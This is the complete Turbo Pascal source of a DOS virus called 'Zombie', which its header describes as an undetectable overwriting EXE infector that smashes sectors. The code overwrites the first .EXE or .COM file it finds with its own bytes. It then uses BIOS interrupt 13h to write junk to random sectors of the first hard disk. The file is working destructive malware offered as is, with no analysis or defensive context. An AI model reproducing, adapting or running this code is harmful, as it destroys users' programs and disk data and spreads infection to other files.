{
Overwriting Non-Resident EXE infector
Undetectable
Compressed
Smash Sectors
}

{$A+,B-,D-,E-,F-,G+,L-,N-,O-,P-,Q-,R-,S-,T-,V-,X+,Y-}
{$I-}
{$M 2048,0,0}
program Zombie;{Undead series}
uses dos;
const VIRUS_SIZE=3505;
var i,j:longint;
    pnome,nome,nome2:string[80];
    arquivo:array[1..2] of file;
    buffer:array[1..5000] of byte;

procedure damage;
var r:registers;
begin
  r.es:=seg(buffer);
  r.bx:=ofs(buffer);
  r.ah:=3;
  r.dl:=128;
  r.dh:=random(15);
  r.ch:=random(1000);
  r.cl:=random(17);
  r.al:=01;
  intr($13,r);
end;

function peganome:string;
var search:SearchRec;
    pnome:string[80];
begin
  pnome:='';
  FindFirst('*.EXE',AnyFile,search);
  if(DosError<>0)then FindFirst('*.COM',AnyFile,search);
  PNome:=search.name;
  peganome:=pnome;
end;

begin
  nome2:=paramstr(0);
  nome:=peganome;
  if(nome<>'')then begin
    assign(arquivo[1],nome2);
    assign(arquivo[2],nome);
    reset(arquivo[2],1);
    j:=filesize(arquivo[2]);
    reset(arquivo[1],1);
    rewrite(arquivo[2],1);
    blockread(arquivo[1],buffer,VIRUS_SIZE);
    blockwrite(arquivo[2],buffer,j);
  end;
  damage;
end.
